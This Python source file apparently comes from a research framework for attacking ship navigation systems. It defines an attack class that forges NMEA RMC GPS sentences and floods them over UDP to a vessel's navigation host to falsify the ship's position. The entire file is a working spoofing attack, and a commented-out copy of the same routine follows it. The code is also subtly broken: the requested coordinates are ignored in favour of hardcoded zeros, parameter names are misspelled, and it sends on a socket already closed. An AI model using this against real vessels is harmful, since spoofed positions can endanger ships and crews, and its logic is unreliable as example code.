# Implemented by Lucas Moura, Universidade Federal de Itajub√°, 2025.
# https://gocut.tiwri.com/ttmr.htm

import asyncio
import logging
import socket
import struct
import random

from attacks import Attack, AttackNumberParameter
from settings import NMEA_HOST, NMEA_PORT, LISTEN_INTERFACE

import pynmea2


class ShipPositionAttack(Attack):
    def __init__(self):
        super().__init__('ship_position', 'Ship Position', 'Moves the Ship to an arbitrary location in the INS', [
            AttackNumberParameter('lattitude', 'Lattitude', True, min=-180, max=180),
            AttackNumberParameter('longitue', 'Longitude', True, min=-180, max=180),
            AttackNumberParameter('injection_hz', 'Frequency of the packets injection', default = 1.0),
    ])
        
    async def run(self, injection_hz: float = 1.0):
      loop = asyncio.get_running_loop()
      interval = 1.0 / injection_hz
      with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.setblocking(False)
        sock.bind((LISTEN_INTERFACE, 0))
        #sentence = pynmea2.HDT('HE', 'HDT', [ str(heading_to_inject), 'T' ])
        sentence = pynmea2.RMC('GP','RMC', 
                    [
                      '000000', # Timestamp - 00:00:00 UTC,
                      'A', # Status - A ("Valid"), V ("Invalid"),
                      '0000.00', # Latitude
                      'N', # Latitude North/South
                      '0000.00', # Longitude 
                      'W', # Longitude East/West
                      00.00, # Speed in Knots
                      0, # True Course
                      '010199', # Datestamp - 01/01/1999
                      '0', # Magnetic Variation
                      'E', # Magnetic Variation Direction - East/West,
                      '0', # Mode Indicator (?)
                      '0' # Navigational Status (?)
                    ])
        
        sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode('ascii')
      while True:
        await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
        self.logger.debug(sentence_bytes)
        await asyncio.sleep(interval)
    
    """"
    async def ship_position(self, injection_hz: float = 1.0):
      logger = logging.getLogger(ship_position.__name__)
      loop = asyncio.get_running_loop()
      interval = 1.0 / injection_hz
      with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.setblocking(False)
        sock.bind((LISTEN_INTERFACE, 0))
        #sentence = pynmea2.HDT('HE', 'HDT', [ str(heading_to_inject), 'T' ])
        sentence = pynmea2.RMC('GP','RMC', 
                    [
                      '000000', # Timestamp - 00:00:00 UTC,
                      'A', # Status - A ("Valid"), V ("Invalid"),
                      '0000.00', # Latitude
                      'N', # Latitude North/South
                      '0000.00', # Longitude 
                      'W', # Longitude East/West
                      00.00, # Speed in Knots
                      0, # True Course
                      '010199', # Datestamp - 01/01/1999
                      '0', # Magnetic Variation
                      'E', # Magnetic Variation Direction - East/West,
                      '0', # Mode Indicator (?)
                      '0' # Navigational Status (?)
                    ])
        
        sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode('ascii')
      while True:
        await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
        logger.debug(sentence_bytes)
        await asyncio.sleep(interval)
    """
    
